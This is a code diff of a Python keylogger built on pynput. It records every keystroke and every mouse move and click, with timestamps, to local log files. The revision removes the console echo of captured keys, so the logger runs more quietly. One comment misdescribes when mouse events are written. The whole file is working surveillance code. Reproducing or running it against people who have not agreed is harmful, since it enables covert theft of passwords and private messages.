@@ -1,36 +1,37 @@
-from typing import List
-import pynput
 from datetime import datetime
+import pynput
 
 # Define constants
-LOG_FILE = "log.txt"
-MOUSE_RECORD_FILE = "mouse_record.txt"
+KEY_LOG_FILE = "key_log.txt"
+MOUSE_LOG_FILE = "mouse_log.txt"
 MAX_KEYS = 10
 
 # Initialize key counter and list of keys
-count = 0
-keys = []
+key_count = 0
+key_list = []
+
+# Initialize mouse listener and list of mouse events
+mouse_list = []
+
+# Define keyboard event callbacks
 
 
 def on_press(key):
-    global keys, count
+    global key_count, key_list
 
     # Append key to list and increment counter
-    keys.append(key)
-    count += 1
-
-    # Print key to console
-    print(f"Pressed: {key}")
+    key_list.append(key)
+    key_count += 1
 
     # Write keys to file if count threshold is reached
-    if count >= MAX_KEYS:
-        write_file(keys)
-        keys = []
-        count = 0
+    if key_count >= MAX_KEYS:
+        write_key_file(key_list)
+        key_list = []
+        key_count = 0
 
 
-def write_file(keys):
-    with open(LOG_FILE, "a") as f:
+def write_key_file(keys):
+    with open(KEY_LOG_FILE, "a") as f:
         now = datetime.now()
         date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
         f.write(f"\n\n{date_time}\n")
@@ -47,40 +48,44 @@ def write_file(keys):
         f.write("".join(words))
 
 
+def on_release(key):
+    if key == pynput.keyboard.Key.esc:
+        # Stop mouse listener and exit keyboard listener
+        mouse_listener.stop()
+        return False
+
+# Define mouse event callbacks
+
+
 def on_move(x, y):
-    with open(MOUSE_RECORD_FILE, "a") as f:
-        now = datetime.now()
-        date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
-        f.write(f"{date_time}: Mouse moved to ({x}, {y})\n")
+    global mouse_list
+    mouse_list.append(f"Moved to ({x}, {y})")
 
 
 def on_click(x, y, button, pressed):
-    with open(MOUSE_RECORD_FILE, "a") as f:
+    global mouse_list
+    mouse_list.append(
+        f"{button} {'pressed' if pressed else 'released'} at ({x}, {y})")
+
+    # Write mouse events to file if escape button is pressed
+    if not pressed and button == pynput.mouse.Button.left:
+        write_mouse_file(mouse_list)
+        mouse_list = []
+
+
+def write_mouse_file(mouse_events):
+    with open(MOUSE_LOG_FILE, "a") as f:
         now = datetime.now()
         date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
-        if pressed:
-            f.write(
-                f"{date_time}: Mouse clicked at ({x}, {y}) with {button} button pressed\n")
-        else:
-            f.write(
-                f"{date_time}: Mouse released at ({x}, {y}) with {button} button released\n")
+        f.write(f"\n\n{date_time}\n")
+        for event in mouse_events:
+            f.write(event + "\n")
 
 
-def on_scroll(x, y, dx, dy):
-    with open(MOUSE_RECORD_FILE, "a") as f:
-        now = datetime.now()
-        date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
-        f.write(
-            f"{date_time}: Mouse scrolled at ({x}, {y}) with ({dx}, {dy}) direction\n")
+# Start listeners
+mouse_listener = pynput.mouse.Listener(on_move=on_move, on_click=on_click)
+mouse_listener.start()
 
-
-def on_release(key):
-    if key == pynput.keyboard.Key.esc:
-        return False
-
-
-# Start listener
-with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    with pynput.mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as mouse_listener:
-        listener.join()
-        mouse_listener.join()
+with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as key_listener:
+    key_listener.join()
+    mouse_listener.join()
